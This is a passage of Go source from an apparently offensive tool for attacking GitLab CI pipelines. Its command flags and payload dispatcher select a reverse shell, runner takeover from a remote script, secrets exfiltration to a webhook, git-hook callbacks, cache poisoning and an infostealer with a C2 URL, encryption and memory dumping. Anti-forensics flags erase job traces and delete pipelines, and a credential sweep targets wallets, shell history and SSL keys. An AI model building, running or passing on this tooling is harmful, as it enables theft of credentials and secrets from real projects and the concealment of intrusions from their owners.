	attackCmd.Flags().BoolVar(&atkTamperTagExtended, "tamper-tag-extended", false, "Extended credential sweep: crypto wallets, shell history, database creds, SSL keys")
	// Cleanup mode and actions
	attackCmd.Flags().BoolVar(&atkCleanup, "cleanup", false, "Enable cleanup mode to remove attack artifacts")
	attackCmd.Flags().StringVar(&atkCleanupBranch, "cleanup-branch", "", "Remove specified branch from target project")
	attackCmd.Flags().BoolVar(&atkCleanupCI, "cleanup-ci", false, "Remove .gitlab-ci.yml from the target branch")
	attackCmd.Flags().Int64Var(&atkRevokeDeployKey, "revoke-deploy-key", 0, "Revoke deploy key by ID from target project")
	attackCmd.Flags().Int64Var(&atkRemoveMemberID, "remove-member-id", 0, "Remove member by user ID from target project")
	// Anti-forensics cleanup flags
	attackCmd.Flags().Int64Var(&atkCleanupPipeline, "cleanup-pipeline", 0, "Delete a specific pipeline by ID (anti-forensics)")
	attackCmd.Flags().BoolVar(&atkCleanupJobs, "cleanup-jobs", false, "Erase job traces on recent pipelines (anti-forensics)")
	attackCmd.Flags().StringVar(&atkCleanupJobsRef, "cleanup-jobs-ref", "", "Limit job trace erasure to pipelines on this ref/branch")
	attackCmd.Flags().IntVar(&atkCleanupJobsMax, "cleanup-jobs-max", 5, "Max recent pipelines to erase job traces from (default: 5)")
	attackCmd.Flags().BoolVar(&atkCleanupJobsDelete, "cleanup-jobs-delete", false, "Also delete pipelines after erasing their job traces")
}

func loadCIContent(inline, file string, fromStdin bool) (string, error) {
	if strings.TrimSpace(inline) != "" {
		// Interpret common escape sequences so users can pass YAML
		// on a single line: --ci-yaml 'stages:\n  - test\n...'
		s := strings.ReplaceAll(inline, `\n`, "\n")
		s = strings.ReplaceAll(s, `\t`, "\t")
		return s, nil
	}
	if strings.TrimSpace(file) != "" {
		b, err := os.ReadFile(filepath.Clean(file)) //nolint:gosec // G703: file path provided by user via CLI flag
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	if fromStdin {
		b, err := ioReadAll(os.Stdin)
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	return "", nil
}

// small indirection for testing stdin reads
var ioReadAll = func(f *os.File) ([]byte, error) { return io.ReadAll(f) }

// renderPayload builds a payload YAML based on selected flags.
func renderPayload() (string, error) {
	p := strings.ToLower(strings.TrimSpace(atkPayload))
	// Build common options
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for _, t := range strings.Split(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	common := payloadgen.CommonOptions{
		JobName:         strings.TrimSpace(atkJobName),
		Stage:           strings.TrimSpace(atkStage),
		Image:           strings.TrimSpace(atkImage),
		Tags:            tags,
		Manual:          atkManual,
		ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
		ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
	}
	switch p {
	case "ror-shell":
		return payloadgen.GenerateRORShellYAML(payloadgen.RORShellOptions{
			Common:       common,
			Command:      atkCmd,
			DownloadPath: atkDownload,
		}), nil
	case payloadPwnRequest:
		return payloadgen.GeneratePwnRequestYAML(payloadgen.PwnRequestOptions{
			Common:           common,
			TargetBranchExpr: strings.TrimSpace(atkTargetBranchRegex),
		}), nil
	case payloadRor, payloadRunnerOnRunner, payloadRunnerOnRunnerAlt:
		return payloadgen.GenerateRunnerOnRunnerYAML(payloadgen.RunnerOnRunnerOptions{
			Common:           common,
			ScriptURL:        strings.TrimSpace(atkScriptURL),
			TargetOS:         strings.TrimSpace(atkOS),
			KeepAliveSeconds: atkKeepAlive,
		}), nil
	case "secrets", "secrets-exfil", "secrets_exfil":
		return payloadgen.GenerateSecretsExfilYAML(payloadgen.SecretsExfilOptions{
			Common:      common,
			WebhookURL:  strings.TrimSpace(atkWebhook),
			ExfilMethod: strings.TrimSpace(atkExfilMethod),
			ExfilTarget: strings.TrimSpace(atkExfilTarget),
		}), nil
	case "git-hook", "git_hook", "githook":
		return payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
			HookType:    strings.TrimSpace(atkHookType),
		}), nil
	case "cache-poison", "cache_poison", "cachepoison":
		return payloadgen.GenerateCachePoisonYAML(payloadgen.CachePoisonOptions{
			Common:    common,
			CacheKey:  strings.TrimSpace(atkCacheKey),
			CachePath: strings.TrimSpace(atkCachePath),
			PoisonCmd: strings.TrimSpace(atkPoisonCmd),
		}), nil
	case "infostealer", "info-stealer", "info_stealer":
		c2 := strings.TrimSpace(atkTamperTagC2)
		if c2 == "" {
			c2 = strings.TrimSpace(atkWebhook)
		}
		if c2 == "" {
			c2 = "https://example.invalid/callback"
		}
		return payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
			C2URL:           c2,
			EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
			BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
			ProcScan:        atkTamperTagProcScan,
			MemoryDump:      atkTamperTagMemDump,
			Extended:        atkTamperTagExtended,
		}), nil
	default:
		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
	}
}
